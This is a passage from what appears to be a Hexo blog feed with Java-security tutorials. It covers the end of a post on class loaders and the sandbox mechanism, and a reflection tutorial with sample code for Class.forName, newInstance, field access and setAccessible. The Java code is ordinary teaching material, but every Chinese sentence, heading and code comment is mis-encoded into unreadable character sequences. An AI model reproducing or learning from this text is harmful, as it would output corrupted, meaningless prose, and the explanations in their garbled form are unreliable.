´åè€…ï¼‰å°±æ˜¯å¾ˆå¥½çš„é€‰æ‹©ã€‚</p><p>ä»å›¾å¯çŸ¥rt.jaræ ¸å¿ƒåŒ…æ˜¯æœ‰Bootstrapç±»åŠ è½½å™¨åŠ è½½çš„ï¼Œå…¶å†…åŒ…å«SPIæ ¸å¿ƒæ¥å£ç±»ï¼Œç”±äºSPIä¸­çš„ç±»ç»å¸¸éœ€è¦è°ƒç”¨å¤–éƒ¨å®ç°ç±»çš„æ–¹æ³•ï¼Œè€Œjdbc.jaråŒ…å«å¤–éƒ¨å®ç°ç±»(jdbc.jarå­˜åœ¨äºclasspathè·¯å¾„)æ— æ³•é€šè¿‡Bootstrapç±»åŠ è½½å™¨åŠ è½½ï¼Œå› æ­¤åªèƒ½å§”æ´¾çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨æŠŠjdbc.jarä¸­çš„å®ç°ç±»åŠ è½½åˆ°å†…å­˜ä»¥ä¾¿SPIç›¸å…³ç±»ä½¿ç”¨ã€‚æ˜¾ç„¶è¿™ç§çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨çš„åŠ è½½æ–¹å¼ç ´åäº†â€œåŒäº²å§”æ´¾æ¨¡å‹â€ï¼Œå®ƒåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æŠ›å¼ƒåŒäº²å§”æ´¾åŠ è½½é“¾æ¨¡å¼ï¼Œä½¿ç¨‹åºå¯ä»¥é€†å‘ä½¿ç”¨ç±»åŠ è½½å™¨ï¼Œå½“ç„¶è¿™ä¹Ÿä½¿å¾—Javaç±»åŠ è½½å™¨å˜å¾—æ›´åŠ çµæ´»ã€‚<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513649714-a69dcf2d-6590-4e55-9bf4-a706a33c9e46.png"></p><ul><li><strong>æ²™ç®±å®‰å…¨æœºåˆ¶</strong></li></ul><p>è‡ªå®šä¹‰ String ç±»ï¼Œä½†æ˜¯åœ¨åŠ è½½è‡ªå®šä¹‰ String ç±»çš„æ—¶å€™ä¼šç‡å…ˆä½¿ç”¨å¼•å¯¼ç±»åŠ è½½å™¨åŠ è½½ï¼Œè€Œå¼•å¯¼ç±»åŠ è½½å™¨åœ¨åŠ è½½çš„è¿‡ç¨‹ä¸­ä¼šå…ˆåŠ è½½ JDK è‡ªå¸¦çš„æ–‡ä»¶ï¼ˆrt.jar åŒ…ä¸­çš„ javalangString.classï¼‰ï¼ŒæŠ¥é”™ä¿¡æ¯è¯´æ²¡æœ‰ main æ–¹æ³•å°±æ˜¯å› ä¸ºåŠ è½½çš„ rt.jar åŒ…ä¸­çš„ String ç±»ã€‚è¿™æ ·å¯ä»¥ä¿è¯å¯¹ Java æ ¸å¿ƒæºä»£ç çš„ä¿æŠ¤ï¼Œè¿™å°±æ˜¯æ²™ç®±å®‰å…¨æœºåˆ¶ã€‚</p><p>å‚è€ƒï¼š<a href="https://segmentfault.com/a/1190000037574626">https://segmentfault.com/a/1190000037574626</a></p><p><a href="https://www.javasec.org/javase/ClassLoader/">https://www.javasec.org/javase/ClassLoader/</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaåŸºç¡€ </tag>
            
            <tag> ç±»åŠ è½½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaåå°„</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<p>Javaåå°„(Reflection)æ˜¯Javaéå¸¸é‡è¦çš„åŠ¨æ€ç‰¹æ€§ï¼Œé€šè¿‡ä½¿ç”¨åå°„æˆ‘ä»¬ä¸ä»…å¯ä»¥è·å–åˆ°ä»»ä½•ç±»çš„æˆå‘˜æ–¹æ³•(Methods)ã€æˆå‘˜å˜é‡(Fields)ã€æ„é€ æ–¹æ³•(Constructors)ç­‰ä¿¡æ¯ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºJavaç±»å®ä¾‹ã€è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•ã€ä¿®æ”¹ä»»æ„çš„ç±»æˆå‘˜å˜é‡å€¼ç­‰ã€‚Javaåå°„æœºåˆ¶æ˜¯Javaè¯­è¨€çš„åŠ¨æ€æ€§çš„é‡è¦ä½“ç°ï¼Œä¹Ÿæ˜¯Javaçš„å„ç§æ¡†æ¶åº•å±‚å®ç°çš„çµé­‚ã€‚</p><p>åå°„æœºåˆ¶çš„ç›¸å…³ç±»åœ¨å“ªä¸ªåŒ…ä¸‹ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.*;</span><br></pre></td></tr></table></figure><p>åå°„æœºåˆ¶ç›¸å…³çš„é‡è¦çš„ç±»æœ‰å“ªäº›ï¼Ÿ</p><table><thead><tr><th>ç±»</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>a.lang.Class</td><td>ä»£è¡¨æ•´ä¸ªå­—èŠ‚ç ã€‚ä»£è¡¨ä¸€ä¸ªç±»å‹ï¼Œä»£è¡¨æ•´ä¸ªç±»ã€‚</td></tr><tr><td>java.lang.reflect.Method</td><td>ä»£è¡¨å­—èŠ‚ç ä¸­çš„æ–¹æ³•å­—èŠ‚ç ã€‚ä»£è¡¨ç±»ä¸­çš„æ–¹æ³•ã€‚</td></tr><tr><td>java.lang.reflect.Constructor</td><td>ä»£è¡¨å­—èŠ‚ç ä¸­çš„æ„é€ æ–¹æ³•å­—èŠ‚ç ã€‚ä»£è¡¨ç±»ä¸­çš„æ„é€ æ–¹æ³•ã€‚</td></tr><tr><td>java.lang.reflect.Field</td><td>ä»£è¡¨å­—èŠ‚ç ä¸­çš„å±æ€§å­—èŠ‚ç ã€‚ä»£è¡¨ç±»ä¸­çš„æˆå‘˜å˜é‡ï¼ˆé™æ€å˜é‡+å®ä¾‹å˜é‡ï¼‰ã€‚</td></tr></tbody></table><p>æ³¨ï¼šå¿…é¡»å…ˆè·å¾—Classæ‰èƒ½è·å–Methodã€Constructorã€Fieldã€‚</p><h2 id="1è·å–Classå¯¹è±¡"><a href="#1è·å–Classå¯¹è±¡" class="headerlink" title="1è·å–Classå¯¹è±¡"></a>1è·å–Classå¯¹è±¡</h2><p>Javaåå°„æ“ä½œçš„æ˜¯java.lang.Classå¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆæƒ³åŠæ³•è·å–åˆ°Classå¯¹è±¡ï¼Œé€šå¸¸æˆ‘ä»¬æœ‰å¦‚ä¸‹å‡ ç§æ–¹å¼è·å–ä¸€ä¸ªç±»çš„Classå¯¹è±¡ï¼š</p><ol><li>ç±»å.classï¼Œå¦‚:com.anbai.sec.classloader.TestHelloWorld.classã€‚</li><li>Class.forName(â€œcom.anbai.sec.classloader.TestHelloWorldâ€)ã€‚</li><li>classLoader.loadClass(â€œcom.anbai.sec.classloader.TestHelloWorldâ€);</li></ol><h3 id="é€šè¿‡åå°„å®ä¾‹åŒ–å¯¹è±¡"><a href="#é€šè¿‡åå°„å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="é€šè¿‡åå°„å®ä¾‹åŒ–å¯¹è±¡"></a>é€šè¿‡åå°„å®ä¾‹åŒ–å¯¹è±¡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹è±¡.newInstance()</span><br></pre></td></tr></table></figure><p><strong>æ³¨</strong>ï¼šnewInstance()æ–¹æ³•å†…éƒ¨å®é™…ä¸Šè°ƒç”¨äº†<strong>æ— å‚æ•°æ„é€ æ–¹æ³•</strong><font style="color:rgb(77, 77, 77);">ï¼Œå¿…é¡»ä¿è¯æ— å‚æ„é€ å­˜åœ¨æ‰å¯ä»¥ã€‚<br></font>å¦åˆ™ä¼šæŠ›å‡ºjava.lang.InstantiationExceptionå¼‚å¸¸ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest02</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// ä¸‹é¢è¿™æ®µä»£ç æ˜¯ä»¥åå°„æœºåˆ¶çš„æ–¹å¼åˆ›å»ºå¯¹è±¡ã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„æœºåˆ¶ï¼Œè·å–Classï¼Œé€šè¿‡Classæ¥å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.User&quot;</span>);</span><br><span class="line">        <span class="comment">// newInstance() è¿™ä¸ªæ–¹æ³•ä¼šè°ƒç”¨Userè¿™ä¸ªç±»çš„æ— å‚æ•°æ„é€ æ–¹æ³•ï¼Œå®Œæˆå¯¹è±¡çš„åˆ›å»ºã€‚</span></span><br><span class="line">        <span class="comment">// é‡ç‚¹æ˜¯ï¼šnewInstance()è°ƒç”¨çš„æ˜¯æ— å‚æ„é€ ï¼Œå¿…é¡»ä¿è¯æ— å‚æ„é€ æ˜¯å­˜åœ¨çš„ï¼</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ åªæ˜¯å¸Œæœ›ä¸€ä¸ªç±»çš„<strong>é™æ€ä»£ç å—</strong>æ‰§è¡Œï¼Œå…¶å®ƒä»£ç ä¸€å¾‹ä¸æ‰§è¡Œï¼Œå¯ä»¥ä½¿ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;å®Œæ•´ç±»å&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•çš„æ‰§è¡Œä¼šå¯¼è‡´<strong>ç±»åŠ è½½</strong>ï¼Œç±»åŠ è½½æ—¶ï¼Œé™æ€ä»£ç å—æ‰§è¡Œã€‚</p><h2 id="2åå°„Filedã€åå°„-åç¼–è¯‘ä¸€ä¸ªç±»çš„å±æ€§ã€‘"><a href="#2åå°„Filedã€åå°„-åç¼–è¯‘ä¸€ä¸ªç±»çš„å±æ€§ã€‘" class="headerlink" title="2åå°„Filedã€åå°„&#x2F;åç¼–è¯‘ä¸€ä¸ªç±»çš„å±æ€§ã€‘"></a>2åå°„Filedã€åå°„&#x2F;åç¼–è¯‘ä¸€ä¸ªç±»çš„å±æ€§ã€‘</h2><h3 id="2-1Classç±»æ–¹æ³•"><a href="#2-1Classç±»æ–¹æ³•" class="headerlink" title="2.1Classç±»æ–¹æ³•"></a>2.1Classç±»æ–¹æ³•</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713695474603-5151f213-23dc-44f1-9e7f-5e0dbcf9a1c4.png"></p><h3 id="2-2Fieldç±»æ–¹æ³•"><a href="#2-2Fieldç±»æ–¹æ³•" class="headerlink" title="2.2Fieldç±»æ–¹æ³•"></a>2.2Fieldç±»æ–¹æ³•</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713695685193-eb42119a-1bc4-498c-9e9b-e5193b7adaf5.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é€šè¿‡åå°„æœºåˆ¶ï¼Œåç¼–è¯‘ä¸€ä¸ªç±»çš„å±æ€§Fieldï¼ˆäº†è§£ä¸€ä¸‹ï¼‰</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest06</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">studentClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Student&quot;</span>);</span><br><span class="line">        s.append(Modifier.toString(studentClass.getModifiers()) + <span class="string">&quot; class &quot;</span> + studentClass.getSimpleName() + <span class="string">&quot; &#123;\n&quot;</span>);<span class="comment">// Classç±»çš„getNameæ–¹æ³•</span></span><br><span class="line">        <span class="comment">//è·å–æ‰€æœ‰çš„å±æ€§</span></span><br><span class="line">        Field[] fields = studentClass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field f : fields)&#123;</span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="comment">// è·å–å±æ€§çš„ä¿®é¥°ç¬¦åˆ—è¡¨,è¿”å›çš„ä¿®é¥°ç¬¦æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œæ¯ä¸ªæ•°å­—æ˜¯ä¿®é¥°ç¬¦çš„ä»£å·</span></span><br><span class="line">            <span class="comment">// ç”¨Modifierç±»çš„toStringè½¬æ¢æˆå­—ç¬¦ä¸²</span></span><br><span class="line">            s.append(Modifier.toString(f.getModifiers()));</span><br><span class="line">            <span class="keyword">if</span> (f.getModifiers() != <span class="number">0</span>) s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            s.append(f.getType().getSimpleName());<span class="comment">// è·å–å±æ€§çš„ç±»å‹</span></span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            s.append(f.getName());<span class="comment">// è·å–å±æ€§çš„åå­—</span></span><br><span class="line">            s.append(<span class="string">&quot;;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3é€šè¿‡åå°„æœºåˆ¶è®¿é—®ä¸€ä¸ªjavaå¯¹è±¡çš„å±æ€§"><a href="#2-3é€šè¿‡åå°„æœºåˆ¶è®¿é—®ä¸€ä¸ªjavaå¯¹è±¡çš„å±æ€§" class="headerlink" title="2.3é€šè¿‡åå°„æœºåˆ¶è®¿é—®ä¸€ä¸ªjavaå¯¹è±¡çš„å±æ€§"></a>2.3é€šè¿‡åå°„æœºåˆ¶è®¿é—®ä¸€ä¸ªjavaå¯¹è±¡çš„å±æ€§</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å¿…é¡»æŒæ¡ï¼š</span></span><br><span class="line"><span class="comment">    æ€ä¹ˆé€šè¿‡åå°„æœºåˆ¶è®¿é—®ä¸€ä¸ªjavaå¯¹è±¡çš„å±æ€§ï¼Ÿ</span></span><br><span class="line"><span class="comment">        ç»™å±æ€§èµ‹å€¼set</span></span><br><span class="line"><span class="comment">        è·å–å±æ€§çš„å€¼get</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest07</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="comment">//ä¸ä½¿ç”¨åå°„æœºåˆ¶ç»™å±æ€§èµ‹å€¼</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        <span class="comment">/**ç»™å±æ€§èµ‹å€¼ä¸‰è¦ç´ ï¼šç»™så¯¹è±¡çš„noå±æ€§èµ‹å€¼1111</span></span><br><span class="line"><span class="comment">         * è¦ç´ 1ï¼šå¯¹è±¡s</span></span><br><span class="line"><span class="comment">         * è¦ç´ 2ï¼šnoå±æ€§</span></span><br><span class="line"><span class="comment">         * è¦ç´ 3ï¼š1111</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        student.no = <span class="number">1111</span>;</span><br><span class="line">        <span class="comment">/**è¯»å±æ€§å€¼ä¸¤ä¸ªè¦ç´ ï¼šè·å–så¯¹è±¡çš„noå±æ€§çš„å€¼ã€‚</span></span><br><span class="line"><span class="comment">         * è¦ç´ 1ï¼šå¯¹è±¡s</span></span><br><span class="line"><span class="comment">         * è¦ç´ 2ï¼šnoå±æ€§</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(student.no);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨åå°„æœºåˆ¶ç»™å±æ€§èµ‹å€¼</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">studentClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Student&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> studentClass.newInstance();<span class="comment">// objå°±æ˜¯Studentå¯¹è±¡ã€‚ï¼ˆåº•å±‚è°ƒç”¨æ— å‚æ•°æ„é€ æ–¹æ³•ï¼‰</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–noå±æ€§ï¼ˆæ ¹æ®å±æ€§çš„åç§°æ¥è·å–Fieldï¼‰</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">noField</span> <span class="operator">=</span> studentClass.getDeclaredField(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        <span class="comment">// ç»™objå¯¹è±¡(Studentå¯¹è±¡)çš„noå±æ€§èµ‹å€¼</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            è™½ç„¶ä½¿ç”¨äº†åå°„æœºåˆ¶ï¼Œä½†æ˜¯ä¸‰è¦ç´ è¿˜æ˜¯ç¼ºä¸€ä¸å¯ï¼š</span></span><br><span class="line"><span class="comment">                è¦ç´ 1ï¼šobjå¯¹è±¡</span></span><br><span class="line"><span class="comment">                è¦ç´ 2ï¼šnoå±æ€§</span></span><br><span class="line"><span class="comment">                è¦ç´ 3ï¼š22222å€¼</span></span><br><span class="line"><span class="comment">            æ³¨æ„ï¼šåå°„æœºåˆ¶è®©ä»£ç å¤æ‚äº†ï¼Œä½†æ˜¯ä¸ºäº†ä¸€ä¸ªâ€œçµæ´»â€ï¼Œè¿™ä¹Ÿæ˜¯å€¼å¾—çš„ã€‚</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        noField.set(obj, <span class="number">22222</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¯»å–å±æ€§çš„å€¼</span></span><br><span class="line">        <span class="comment">// ä¸¤ä¸ªè¦ç´ ï¼šè·å–objå¯¹è±¡çš„noå±æ€§çš„å€¼ã€‚</span></span><br><span class="line">        System.out.println(noField.get(obj));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-3-1set-å¯ä»¥è®¿é—®ç§æœ‰å±æ€§å˜›ï¼Ÿ"><a href="#2-3-1set-å¯ä»¥è®¿é—®ç§æœ‰å±æ€§å˜›ï¼Ÿ" class="headerlink" title="2.3.1set()å¯ä»¥è®¿é—®ç§æœ‰å±æ€§å˜›ï¼Ÿ"></a>2.3.1set()å¯ä»¥è®¿é—®ç§æœ‰å±æ€§å˜›ï¼Ÿ</h4><p>ä¸å¯ä»¥ï¼Œéœ€è¦æ‰“ç ´å°è£…ï¼Œæ‰å¯ä»¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¯ä»¥è®¿é—®ç§æœ‰çš„å±æ€§å—ï¼Ÿ</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> studentClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// æ‰“ç ´å°è£…ï¼ˆåå°„æœºåˆ¶çš„ç¼ºç‚¹ï¼šæ‰“ç ´å°è£…ï¼Œå¯èƒ½ä¼šç»™ä¸æ³•åˆ†å­ç•™ä¸‹æœºä¼šï¼ï¼ï¼ï¼‰</span></span><br><span class="line"><span class="comment">// è¿™æ ·è®¾ç½®å®Œä¹‹åï¼Œåœ¨å¤–éƒ¨ä¹Ÿæ˜¯å¯ä»¥è®¿é—®privateçš„ã€‚</span></span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// ç»™nameå±æ€§èµ‹å€¼</span></span><br><span class="line">nameField.set(obj, <span class="string">&quot;xiaowu&quot;</span>);</span><br><span class="line"><span class="comment">// è·å–nameå±æ€§çš„å€¼</span></span><br><span class="line">System.out.println(nameField.get(obj));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-åå°„Methodã€åå°„-åç¼–è¯‘ä¸€ä¸ªç±»çš„æ–¹æ³•ã€‘"><a href="#3-åå°„Methodã€åå°„-åç¼–è¯‘ä¸€ä¸ªç±»çš„æ–¹æ³•ã€‘" class="headerlink" title="3.åå°„Methodã€åå°„&#x2F;åç¼–è¯‘ä¸€ä¸ªç±»çš„æ–¹æ³•ã€‘"></a>3.åå°„Methodã€åå°„&#x2F;åç¼–è¯‘ä¸€ä¸ªç±»çš„æ–¹æ³•ã€‘</h2><p>methodç±»æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713695831111-278cb78e-f9ae-4711-9618-8bf811cbe38d.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">äº†è§£ä¸€ä¸‹ï¼Œä¸éœ€è¦æŒæ¡ï¼ˆåç¼–è¯‘ä¸€ä¸ªç±»çš„æ–¹æ³•ã€‚ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest09</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">userServiceClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line">        s.append(Modifier.toString(userServiceClass.getModifiers()));</span><br><span class="line">        s.append(<span class="string">&quot; class &quot;</span>);</span><br><span class="line">        s.append(userServiceClass.getSimpleName());</span><br><span class="line">        s.append(<span class="string">&quot; &#123;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ‰€æœ‰çš„Methodï¼ˆåŒ…æ‹¬ç§æœ‰çš„ï¼ï¼‰</span></span><br><span class="line">        Method[] methods = userServiceClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods)&#123;</span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="comment">// è·å–ä¿®é¥°ç¬¦åˆ—è¡¨</span></span><br><span class="line">            s.append(Modifier.toString(m.getModifiers()));</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">// è·å–æ–¹æ³•çš„è¿”å›å€¼ç±»å‹</span></span><br><span class="line">            s.append(m.getReturnType().getSimpleName());</span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">// è·å–æ–¹æ³•å</span></span><br><span class="line">            s.append(m.getName());</span><br><span class="line">            s.append(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            <span class="comment">// æ–¹æ³•çš„ä¿®é¥°ç¬¦åˆ—è¡¨ï¼ˆä¸€ä¸ªæ–¹æ³•çš„å‚æ•°å¯èƒ½ä¼šæœ‰å¤šä¸ªã€‚ï¼‰</span></span><br><span class="line">            Class[] parameterTypes = m.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; parameterTypes.length; i++)&#123;</span><br><span class="line">                s.append(parameterTypes[i].getSimpleName());</span><br><span class="line">                <span class="keyword">if</span> (i != parameterTypes.length - <span class="number">1</span>) s.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            s.append(<span class="string">&quot;) &#123;&#125;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-1-1ã€è°ƒç”¨æ–¹æ³•å››è¦ç´ "><a href="#3-1-1ã€è°ƒç”¨æ–¹æ³•å››è¦ç´ " class="headerlink" title="3.1.1ã€è°ƒç”¨æ–¹æ³•å››è¦ç´ "></a>3.1.1ã€è°ƒç”¨æ–¹æ³•å››è¦ç´ </h3><p>è°ƒç”¨å¯¹è±¡userServiceçš„loginæ–¹æ³•</p><ul><li>è¦ç´ 1ï¼š<strong>å¯¹è±¡</strong> userService</li><li>è¦ç´ 2ï¼šlogin <strong>æ–¹æ³•å</strong></li><li>è¦ç´ 3ï¼š<strong>å®å‚åˆ—è¡¨</strong></li><li>è¦ç´ 4ï¼š<strong>è¿”å›å€¼</strong></li></ul><p><strong>æ³¨ï¼š</strong> Methodç±»ä¸­invoke()ä½¿ç”¨æ³¨æ„äº‹é¡¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³•.invoke(å¯¹è±¡, å®å‚);</span><br></pre></td></tr></table></figure><h4 